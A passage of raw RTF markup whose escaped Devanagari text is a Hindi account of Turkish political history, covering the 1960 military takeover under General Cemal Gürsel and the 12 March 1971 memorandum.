\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2309\'3f\u2346\'3f\u2381\'3f\u2352\'3f\u2367\'3f\u2354\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506 , 1 9 60 }{
\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2350\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506 , }{\rtlch\fcs1 \af39 
\ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2335\'3f\u2352\'3f\u2381\'3f\u2325\'3f\u2368\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 
\af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2358\'3f\u2360\'3f\u2381\'3f\u2340\'3f\u2381\'3f\u2352\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 
\hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2375\'3f\u2344\'3f\u2366\'3f\u2325\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 
\insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2366\'3f\u2350\'3f\u2366\'3f\u2344\'3f\u2381\'3f\u2351\'3f}{
\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2325\'3f\u2352\'3f\u2381\'3f\u2350\'3f\u2330
\'3f\u2366\'3f\u2352\'3f\u2368\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506 , }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2332\'3f
\u2344\'3f\u2352\'3f\u2354\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2350\'3f\u2367
\'3f\u2344\'3f\u2367\'3f\u2354\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2327\'3f
\u2369\'3f\u2354\'3f\u2360\'3f\u2375\'3f\u2354\'3f\u2354\'3f\u2375\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 
\loch\af39\dbch\af31505\hich\f39 \uc1\u2344\'3f\u2375\'3f\u2344\'3f\u2381\'3f\u2337\'3f\u2352\'3f\u2381\'3f\u2360\'3f\u2325\'3f\u2379\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 
\af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2358\'3f\u2366\'3f\u2360\'3f\u2344\'3f\u2354\'3f\u2366\'3f\u2312\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 
\hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2346\'3f\u2352\'3f\u2366\'3f\u2332\'3f\u2367\'3f\u2340\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 
\insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2327\'3f\u2352\'3f\u2381\'3f\u2344\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 
\insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2319\'3f\u2325\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 
\insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2309\'3f\u2344\'3f\u2381\'3f\u2340\'3f\u2352\'3f\u2381\'3f\u2352\'3f\u2366
\'3f\u2359\'3f\u2381\'3f\u2335\'3f\u2381\'3f\u2352\'3f\u2367\'3f\u2351\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 
\loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2375\'3f\u2344\'3f\u2366\'3f\u2325\'3f\u2379\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2344\'3f\u2375\'3f\u2340\'3f\u2371\'3f\u2340\'3f\u2381\'3f\u2357\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{
\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2327\'3f\u2352\'3f\u2375\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 
\af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2352\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2309\'3f\u2344\'3f\u2381\'3f\u2340\'3f\u2352\'3f\loch\af39\dbch\af31505\hich\f39 \u2366\'3f\u2359\'3f\u2381\'3f\u2335\'3f\u2381\'3f\u2352\'3f\u2367\'3f\u2351\'3f}{\rtlch\fcs1 \af0 
\ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2352\'3f\u2366\'3f\u2359\'3f\u2381\'3f\u2335\'3f\u2381\'3f\u2352
\'3f\u2346\'3f\u2340\'3f\u2367\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506 , }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2346\'3f
\u2381\'3f\u2352\'3f\u2343\'3f\u2366\'3f\u2344\'3f\u2350\'3f\u2344\'3f\u2381\'3f\u2340\'3f\u2381\'3f\u2352\'3f\u2368\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2352\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 
\loch\af39\dbch\af31505\hich\f39 \uc1\u2346\'3f\u2381\'3f\u2352\'3f\u2343\'3f\u2366\'3f\u2344\'3f\u2350\'3f\u2344\'3f\u2381\'3f\u2340\'3f\u2381\'3f\u2352\'3f\u2368\'3f\u2325\'3f\u2379\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 
\hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2352\'3f\u2370\'3f\u2346\'3f\u2350\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 
\insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2375\'3f\u2357\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 
\insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2327\'3f\u2352\'3f\u2381\'3f\u2344\'3f\u2375\'3f\u2404\'3f}{\rtlch\fcs1 
\af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2309\'3f\u2325\'3f\u2381\'3f\u2335\'3f\u2379\'3f\u2348\'3f
\u2352\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  1 9 61 }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2350\'3f\u2366\'3f}{
\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2330\'3f\u2369\'3f\u2344\'3f\u2366\'3f\u2357
\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2346\'3f\u2331\'3f\u2367\'3f}{
\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506 , }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2376\'3f\u2344\'3f\u2381\'3f\u2351
\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2358\'3f\u2366\'3f\u2360\'3f\u2344\'3f
\u2354\'3f\u2375\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2350\'3f\u2366\'3f\u2344
\'3f\u2367\'3f\u2360\'3f\u2354\'3f\u2366\'3f\u2312\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 
\loch\af39\dbch\af31505\hich\f39 \uc1\u2346\'3f\u2344\'3f\u2367\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 
\loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2340\'3f\u2381\'3f\u2340\'3f\u2366\'3f\u2350\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2347\'3f\u2352\'3f\u2381\'3f\u2325\'3f\u2366\'3f\u2351\'3f\u2379\'3f\u2404\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506 
 }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2335\'3f\u2352\'3f\u2381\'3f\u2325\'3f\u2368\'3f\u2350\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 
\hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2357\'3f\u2367\'3f\u2349\'3f\u2367\'3f\u2344\'3f\u2381\'3f\u2344\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 
\insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2325\'3f\u2335\'3f\u2381\'3f\u2335\'3f\u2352\'3f\u2346\'3f\u2344\'3f\u2381
\'3f\u2341\'3f\u2368\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2306\'3f
\u2327\'3f\u2336\'3f\u2344\'3f\u2361\'3f\u2352\'3f\u2370\'3f\u2325\'3f\u2379\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 
\loch\af39\dbch\af31505\hich\f39 \uc1\u2309\'3f\u2360\'3f\u2347\'3f\u2354\'3f\u2340\'3f\u2366\'3f\u2325\'3f\u2379\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2325\'3f\u2366\'3f\u2352\'3f\u2339\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  12 }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2350\'3f\u2366\'3f\u2352\'3f\u2381\'3f\u2330\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506 , 1 9 71 }{\rtlch\fcs1 \af39 
\ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2350\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506 , }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2335\'3f\u2352\'3f\u2381\'3f\u2325\'3f\u2368\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 
\ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2375\'3f\u2344\'3f\u2366\'3f\u2354\'3f\u2375\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  "}{
\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2358\'3f\u2325\'3f\u2381\'3f\u2340\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506 
 }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2352\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2349\'3f\u2352\'3f\u2379\'3f\u2360\'3f\u2375\'3f\u2350\'3f\u2306\'3f\u2342\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506 
 }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2352\'3f\u2325\'3f\u2366\'3f\u2352\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 
\hich\af31506\dbch\af31505\loch\f31506 " }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2325\'3f\u2379\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 
\hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2381\'3f\u2341\'3f\u2366\'3f\u2346\'3f\u2344\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 
\insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2327\'3f\u2352\'3f\u2381\'3f\u2344\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 
\insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2352\'3f\u2366\'3f\u2359\'3f\u2381\'3f\u2335\'3f\u2381\'3f\u2352\'3f\u2346
\'3f\u2340\'3f\u2367\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2379\'3f
\u2344\'3f\u2368\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2352\'3f}{\rtlch\fcs1 
\af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2352\'3f\u2366\'3f\u2359\'3f\u2381\'3f\u2335\'3f\u2381\'3f
\u2352\'3f\u2367\'3f\u2351\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2349
\'3f\u2366\'3f\u2350\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2319\'3f
\u2325\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2332\'3f\u2381\'3f\u2334\'3f\u2366
\'3f\u2346\'3f\u2344\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2346\'3f\u2381\'3f
\u2352\'3f\u2360\'3f\u2381\'3f\u2340\'3f\u2369\'3f\u2340\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 
\loch\af39\dbch\af31505\hich\f39 \uc1\u2327\'3f\u2352\'3f\u2381\'3f\u2351\'3f\u2379\'3f\u2404\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2313\'3f\u2361\'3f\u2368\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2342\'3f\u2367\'3f\u2344\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506 , 1 9 65 }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2350\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2340\'3f\u2381\'3f\u2340\'3f\u2366\'3f\u2350\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{
\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2310\'3f\u2319\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 
\ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2337\'3f\u2375\'3f\u2350\'3f\u2367\'3f\u2352\'3f\u2354\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{
\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2344\'3f\u2381\'3f\u2351\'3f\u2366\'3f\u2351\'3f\u2346\'3f\u2366\'3f\u2354\'3f\u2367\'3f\u2325\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 
\insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2346\'3f\u2366\'3f\u2352\'3f\u2381\'3f\u2335\'3f\u2368\'3f\u2325\'3f\u2379
\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2352\'3f\u2325\'3f\u2366\'3f
\u2352\'3f\u2354\'3f\u2366\'3f\u2312\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2311
\'3f\u2360\'3f\u2381\'3f\u2340\'3f\u2368\'3f\u2347\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 
\loch\af39\dbch\af31505\hich\f39 \uc1\u2354\'3f\u2367\'3f\u2344\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 
\loch\af39\dbch\af31505\hich\f39 \uc1\u2348\'3f\u2366\'3f\u2343\'3f\u2381\'3f\u2351\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2349\'3f\u2351\'3f\u2379\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
\f39\insrsid5452368\charrsid5452368 \loch\af39\dbch\af31505\hich\f39 \uc1\u2352\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  "}{\rtlch\fcs1 \af39 \ltrch\fcs0 \f39\insrsid5452368\charrsid5452368 
\loch\af39\dbch\af31505\hich\f39 \uc1\u2360\'3f\u2350\'3f\u2381\'3f\u2333\'3f\u2380\'3f\u2340\'3f\u2366\'3f}{\rtlch\fcs1 \af0 \ltrch\fcs0 \insrsid5452368\charrsid5452368 \hich\af31506\dbch\af31505\loch\f31506  }{\rtlch\fcs1 \af39 \ltrch\fcs0 
